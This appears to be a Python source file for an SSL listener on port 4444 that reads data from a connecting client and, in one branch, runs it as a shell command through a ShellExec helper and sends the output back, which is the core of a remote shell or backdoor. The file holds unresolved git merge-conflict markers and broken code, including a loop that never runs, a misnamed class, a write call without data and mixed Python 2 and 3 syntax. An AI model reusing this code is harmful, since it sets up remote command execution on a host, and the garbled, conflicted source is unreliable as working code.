from shellmisc import ShellExec
import socket, ssl, os

class SSLlistener:
   def __init__(self, lport = 4444, laddr = '',timeout = 5):
      self.lport = lport
      self.laddr = laddr
      self.timeout = timeout

   def CreateSocket(self):
      try:
         self.s = socket.socket()
         self.s.bind((self.laddr, self.lport))
         self.s.listen(self.timeout)
         self.newsocket, self.fromaddr = self.s.accept()
         self.c = ssl.wrap_socket(self.newsocket, server_side=True, certfile="server.pem", keyfile="server.key", ssl_version=ssl.PROTOCOL_SSLv3)
#         print(self.c())
         print(str(self.newsocket) +' '+ str(self.fromaddr[0:]))
         return True
      except :
         return False


   def ReadFromSocket(self):
      self.data = self.c.read()
      self.s.listen(self.timeout)
      return  self.data


   def WriteToSocket(self,data):
      try:
         print(self.c.write(data))
         return True
      except :
         return False


   def CloseSocket(self):
      try:
         self.c.close()
         self.s.close()
         return True
      except :
         return False


   def StartupServer(self):
<<<<<<< HEAD
      if self.CreateSocket() == True:
         readdata = self.ReadFromSocket()
         print readdata
         return True
      else:   
         print "socket creation failed"
         return False
   
   def WaitForData(self):
	i = 0
	while i:
	  self.newsocket, self.fromaddr = self.s.accept()
	  while self.ReadFromSocket() != 'exit':
	  	print self.data
		if self.data != ' ':
			aShell = ShellEx(self.data)
			print aShell.GetStdout()
			self.WriteToSocket()
		self.CloseSocket()
		self.StartupServer()
          
=======
      while self.CreateSocket() == True:
         socketdata = self.ReadFromSocket()
         print(socketdata)
         if socketdata == "exit":
            break
         else:
           pass
      print "connection dropped"
                
>>>>>>> e9274c23e31177ed8ad1ec2026d0289adbaa1544
     
if __name__ == '__main__':
   sslear = SSLlistener()
   sslear.CloseSocket()
   sslear.StartupServer()
<<<<<<< HEAD
   while 1:
	sslear.WaitForData()	 	 
	

=======
   
>>>>>>> e9274c23e31177ed8ad1ec2026d0289adbaa1544
